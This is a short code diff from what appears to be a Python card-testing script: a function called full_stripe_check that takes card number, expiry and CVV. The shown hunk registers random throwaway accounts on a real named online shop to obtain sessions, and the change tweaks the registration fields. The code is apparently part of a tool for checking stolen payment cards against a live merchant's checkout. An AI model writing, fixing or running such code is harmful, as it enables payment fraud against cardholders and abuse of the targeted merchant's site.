@@ -29,8 +29,8 @@ def full_stripe_check(cc, mm, yy, cvv):
         # Step 3: Register a new account for a valid session
         random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
         register_data = {
-            'email': random_email, 'password': 'Password123!', 'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/account/', 'register': 'Register',
+            'email': random_email, 'woocommerce-register-nonce': login_nonce,
+            '_wp_http_referer': '/my-account-2/', 'register': 'Register',
         }
         session.post('https://www.ftelettronica.com/my-account-2/', data=register_data)
 
